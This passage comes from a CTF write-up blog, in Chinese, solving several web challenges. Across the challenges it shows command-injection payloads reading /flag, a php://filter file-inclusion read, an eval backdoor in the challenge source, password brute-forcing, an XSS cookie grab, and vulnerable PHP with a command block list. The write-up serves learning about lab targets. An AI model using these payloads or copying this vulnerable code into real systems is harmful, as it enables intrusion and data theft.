+</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>检查 <code>command</code> 中是否包含子串 <code>bllbl</code> ，没有退出程序，有则把输入交给 <code>system</code> 执行命令</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">bllbl;ls /</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323174820199.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">bllbl;cat /flag</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323174945247.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="复读机rce"><span>复读机RCE</span>
+  <a href="#%e5%a4%8d%e8%af%bb%e6%9c%barce" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="file-20250323190725037.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>随意输入
+<figure>
+  <img src="file-20250323190736850.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>目录扫描
+<figure>
+  <img src="file-20250323190750724.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>访问就拿到 flag
+<figure>
+  <img src="file-20250323190804264.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="狗黑子ctf变强之路"><span>狗黑子CTF变强之路</span>
+  <a href="#%e7%8b%97%e9%bb%91%e5%ad%90ctf%e5%8f%98%e5%bc%ba%e4%b9%8b%e8%b7%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="file-20250323190939296.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+随意点击，发现文件包含
+<figure>
+  <img src="file-20250323191958291.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>包含 <code>/etc/passwd</code> ，被告知只允许包含 php 文件
+<figure>
+  <img src="file-20250323192021350.png" alt="image-20250221181200747" loading="lazy"></figure>
+包含 <code>index.php</code></p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">index.php?page=php://filter/convert.base64-encode/resource=index.php</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323192728739.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 简单的文件类型检查，只允许包含 php 文件
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="s1">&#39;.php&#39;</span><span class="p">)</span><span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;只允许包含 php 文件&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">...
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">    if (isset($_GET[&#39;page&#39;])) {
+</span></span></span><span class="line"><span class="cl"><span class="err">        echo &#39;&lt;div id=&#34;display&#34;&gt;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err"> ?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php @eval($_POST[&#39;cmd&#39;])?&gt;
+</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><code>index.php</code> 页面就有 eval 后门，直接拿到 flag
+<figure>
+  <img src="file-20250323192917335.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>同时开启的目录扫描中扫到 <code>admin.php</code>
+<figure>
+  <img src="file-20250323192211181.png" alt="image-20250221181200747" loading="lazy"></figure>
+
+<figure>
+  <img src="file-20250323192415847.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>读取 admin.php 源码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_METHOD&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 硬编码的用户名和密码
+</span></span></span><span class="line"><span class="cl">    <span class="nv">$correctUsername</span> <span class="o">=</span> <span class="s2">&#34;ggouheizi&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$correctPassword</span> <span class="o">=</span> <span class="s2">&#34;zigouhei&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$username</span> <span class="o">==</span> <span class="nv">$correctUsername</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">==</span> <span class="nv">$correctPassword</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 登录成功，直接跳转到 gougougou.php
+</span></span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: gougougou.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$errorMessage</span> <span class="o">=</span> <span class="s2">&#34;用户名或密码错误，请重新输入。&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">...
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;form method=&#34;post&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;label for=&#34;username&#34;&gt;用户名：&lt;/label&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;input type=&#34;text&#34; name=&#34;username&#34;&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;label for=&#34;password&#34;&gt;密码：&lt;/label&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;input type=&#34;password&#34; name=&#34;password&#34;&gt;&lt;br&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;input type=&#34;submit&#34; value=&#34;登录&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;?php if(isset($errorMessage)) { echo $errorMessage; }?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
+</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p><code>gougougou.php</code> 页面一片空白，看来题目就是指定读 <code>index.php</code> 的思路拿 flag
+<figure>
+  <img src="file-20250323193040320.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="椰子树晕淡水鱼"><span>椰子树晕淡水鱼</span>
+  <a href="#%e6%a4%b0%e5%ad%90%e6%a0%91%e6%99%95%e6%b7%a1%e6%b0%b4%e9%b1%bc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="file-20250323193333919.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>目录扫描
+<figure>
+  <img src="file-20250323193551205.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p><code>admin.php</code>
+<figure>
+  <img src="file-20250323193611168.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p><code>password</code> 文件解压需要密码
+<figure>
+  <img src="file-20250323194539451.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>暴力破解，密码 0606
+<figure>
+  <img src="file-20250323195058568.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>是一个字典
+<figure>
+  <img src="file-20250323195143096.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>字典交叉爆破，得出账号密码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">zhsh/zhsh920</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250323210516331.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>文件上传
+<figure>
+  <img src="file-20250324101604272.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>MIMI类型改一下就成功了
+<figure>
+  <img src="file-20250324101530425.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="file-20250324101648356.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="background"><span>background</span>
+  <a href="#background" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>访问靶机
+<figure>
+  <img src="file-20250324102551626.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>看看 js 文件
+<figure>
+  <img src="file-20250324102638950.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="file-20250324102720986.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>源码如下，JS 功能重点是向 <code>change_background.php</code> 发送一个 POST 请求，参数为 <code>d=echo&amp;p=I will do it</code></p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">document.getElementById(&#34;change-bg-btn&#34;).onclick = function() {
+</span></span><span class="line"><span class="cl">    fetch(&#34;change_background.php&#34;, {
+</span></span><span class="line"><span class="cl">        method: &#34;POST&#34;,
+</span></span><span class="line"><span class="cl">        headers: {
+</span></span><span class="line"><span class="cl">            &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        body: new URLSearchParams({
+</span></span><span class="line"><span class="cl">            d: &#34;echo&#34;,
+</span></span><span class="line"><span class="cl">            p: &#34;I will do it！&#34;
+</span></span><span class="line"><span class="cl">        })
+</span></span><span class="line"><span class="cl">    })
+</span></span><span class="line"><span class="cl">    .then(response =&gt; response.text())
+</span></span><span class="line"><span class="cl">    .then(text =&gt; {
+</span></span><span class="line"><span class="cl">        const lines = text.split(&#39;\n&#39;);
+</span></span><span class="line"><span class="cl">        const background = lines[0];     // 第一行是背景图路径
+</span></span><span class="line"><span class="cl">        const message = lines.slice(1).join(&#39;\n&#39;);  // 其余是输出信息
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        document.body.style.backgroundImage = `url(${background})`;
+</span></span><span class="line"><span class="cl">        document.getElementById(&#34;result&#34;).innerText = message;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>向 <code>change_background.php</code> 发送请求，页面返回了 <code>I will do it</code> ，猜测是程序进行了命令执行，源码可能为 <code>system($_POST['d'] . ' ' . $_POST['p']);</code>  这样类似的形式</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/change_background.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">POST:
+</span></span><span class="line"><span class="cl">d=echo&amp;p=I will do it</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250324102948572.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">d=ls&amp;p=/</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><code>ls /</code> 命令执行成功
+<figure>
+  <img src="file-20250324110559575.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>读取 flag
+<figure>
+  <img src="file-20250324110656049.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="xcsmsd"><span>xCsMsD</span>
+  <a href="#xcsmsd" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>访问靶机
+<figure>
+  <img src="file-20250324110828204.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>注册并登录
+<figure>
+  <img src="file-20250324110937804.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>一个命令执行窗口，输入 <code>ls</code> 回显了执行结果</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">index.php
+</span></span><span class="line"><span class="cl">styles.css
+</span></span><span class="line"><span class="cl">users.txt
+</span></span><span class="line"><span class="cl">xss_cmd.php</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250324111148046.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>但后续无论怎么读，都失败了，除了禁止，也有没有回显结果的情况，比较奇怪
+<figure>
+  <img src="file-20250324111454494.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>回到 XSS 窗口，尝试一下 XSS
+<figure>
+  <img src="file-20250324110953681.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&#34;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&#34;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250324114727363.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>弹 Cookie</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&#34;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&#34;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250324114802803.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>是一段 URL 编码，解密发现好像是一个提示？</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">%27+%27-%3E%27-%27%2C+%27%5C%27-%3E%27%2F%27
+</span></span><span class="line"><span class="cl">&#39; &#39;-&gt;&#39;-&#39;, &#39;\&#39;-&gt;&#39;/&#39;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">rev-xss_cmd.php</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>成功执行命令
+<figure>
+  <img src="file-20250324120945773.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>对输出内容进行反转，其中是将空格替换为 <code>-</code>，替换 <code>\</code>为<code>/</code></p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;cookie&#39;</span><span class="p">,</span> <span class="s2">&#34;&#39; &#39;-&gt;&#39;-&#39;, &#39;\&#39;-&gt;&#39;/&#39;&#34;</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="mi">10</span> <span class="o">*</span> <span class="mi">365</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="p">),</span> <span class="s2">&#34;/&#34;</span><span class="p">);</span> <span class="c1">// 10年有效期
+</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">if (isset($_POST[&#39;execute_command&#39;])) {
+</span></span></span><span class="line"><span class="cl"><span class="err">	// 获取用户输入
+</span></span></span><span class="line"><span class="cl"><span class="err">	$command = $_POST[&#39;command_input&#39;];
+</span></span></span><span class="line"><span class="cl"><span class="err">	// 替换空格为空
+</span></span></span><span class="line"><span class="cl"><span class="err">	$command = str_replace(&#39; &#39;, &#39;&#39;, $command);
+</span></span></span><span class="line"><span class="cl"><span class="err">	// 替换 &#34;/&#34; 为空
+</span></span></span><span class="line"><span class="cl"><span class="err">	$command = str_replace(&#39;/&#39;, &#39;&#39;, $command);
+</span></span></span><span class="line"><span class="cl"><span class="err">	// 替换 &#34;-&#34; 为空格
+</span></span></span><span class="line"><span class="cl"><span class="err">	$command = str_replace(&#39;-&#39;, &#39; &#39;, $command);
+</span></span></span><span class="line"><span class="cl"><span class="err">	// 替换 &#34;\&#34; 为 &#34;/&#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">	$command = str_replace(&#39;\\&#39;, &#39;/&#39;, $command);
+</span></span></span><span class="line"><span class="cl"><span class="err">	// 过滤掉一些常见的命令行读取文件的函数
+</span></span></span><span class="line"><span class="cl"><span class="err">	$forbidden_commands = [&#39;cat&#39;, &#39;less&#39;, &#39;more&#39;, &#39;head&#39;, &#39;tail&#39;, &#39;nl&#39;, &#39;strings&#39;, &#39;awk&#39;, &#39;sed&#39;, &#39;dd&#39;, &#39;xxd&#39;];
+</span></span></span><span class="line"><span class="cl"><span class="err">	// 检查输入的命令是否包含被禁止的关键字
+</span></span></span><span class="line"><span class="cl"><span class="err">	foreach ($forbidden_commands as $forbidden) {
+</span></span></span><span class="line"><span class="cl"><span class="err">		if (preg_match(&#34;/\b$forbidden\b/i&#34;, $command)) {
+</span></span></span><span class="line"><span class="cl"><span class="err">			die(&#34;禁止使用此命令: $forbidden&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">		}
+</span></span></span><span class="line"><span class="cl"><span class="err">	}
+</span></span></span><span class="line"><span class="cl"><span class="err">	// 对命令进行转义以增强安全性
+</span></span></span><span class="line"><span class="cl"><span class="err">	$command = escapeshellcmd($command);
+</span></span></span><span class="line"><span class="cl"><span class="err">	// 执行命令并显示输出
+</span></span></span><span class="line"><span class="cl"><span class="err">	$output = shell_exec($command);
+</span></span></span><span class="line"><span class="cl"><span class="err">	echo &#34;&lt;pre&gt;$output&lt;/pre&gt;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
